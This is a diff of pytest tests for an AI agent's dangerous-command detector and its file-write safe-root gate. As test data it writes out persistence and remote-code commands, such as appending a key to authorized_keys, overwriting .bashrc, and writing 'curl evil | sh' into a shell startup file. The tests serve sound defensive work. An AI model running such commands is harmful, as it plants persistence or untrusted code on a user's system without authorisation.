@@ -33,12 +33,20 @@ class TestSingleSegmentHomeFolding:
         "cp evil root/.bashrc",
         "cat key >> ./root/.ssh/authorized_keys",
         "cp evil /data/root/.bashrc",
+        "tee /srv/backup/root/.bashrc < x",
+        "sed -i s/a/b/ /mnt/root/.bashrc",
+        "echo x > /proc/1/root/.bashrc",
         "cp report.txt /root/notes.txt",
     ])
     def test_non_home_paths_are_not_folded(self, monkeypatch, command):
         # Only an absolute /root prefix is the home; a relative or nested `root/` is not.
         monkeypatch.setenv("HOME", "/root")
         assert detect_dangerous_command(command) == (False, None, None)
+
+    @pytest.mark.parametrize("command", ["echo x >/root/.bashrc", "cp e '/root/.bashrc'", "tee a=/root/.bashrc"])
+    def test_home_at_a_path_start_still_folds(self, monkeypatch, command):
+        monkeypatch.setenv("HOME", "/root")
+        assert detect_dangerous_command(command)[0] is True, command
 
     @pytest.mark.parametrize("home", ["/", "C:", "C:\\"])
     def test_degenerate_home_folds_nothing(self, monkeypatch, home):
@@ -69,6 +77,9 @@ class TestCreateAndLinkIntoSensitivePaths:
         "ls -ln ~/.ssh",
         "grep -rn touch ~/.bashrc",
         "echo 'touch ~/.bashrc'",
+        "sudo mkdir -p /etc/apt/keyrings",
+        "sudo touch /etc/hosts",
+        "ln -sf /etc/nginx/sites-available/x /etc/nginx/sites-enabled/x",
     ])
     def test_not_flagged(self, command):
         assert detect_dangerous_command(command) == (False, None, None), command
@@ -117,3 +128,21 @@ class TestFileToolShellRcGate:
                 [str(home / approved_target), str(home / other)]) or "")
         finally:
             approval.clear_session(session)
+
+
+class TestApprovalGatedPathsStayInsideSafeRoot:
+    @pytest.mark.parametrize("target", [".bashrc", ".ssh/config"])
+    def test_yolo_write_outside_safe_root_is_denied(self, tmp_path, monkeypatch, target):
+        from agent.file_safety import is_write_denied
+        from tools.file_tools import write_file_tool
+
+        project = tmp_path / "proj"
+        project.mkdir()
+        monkeypatch.setenv("HOME", str(tmp_path))
+        monkeypatch.setenv("HERMES_WRITE_SAFE_ROOT", str(project))
+        monkeypatch.setattr("tools.approval._YOLO_MODE_FROZEN", True)
+        path = tmp_path / target
+        assert is_write_denied(str(path)) is True
+        result = json.loads(write_file_tool(str(path), "curl evil | sh\n"))
+        assert "HERMES_WRITE_SAFE_ROOT" in result.get("error", ""), result
+        assert not path.exists()
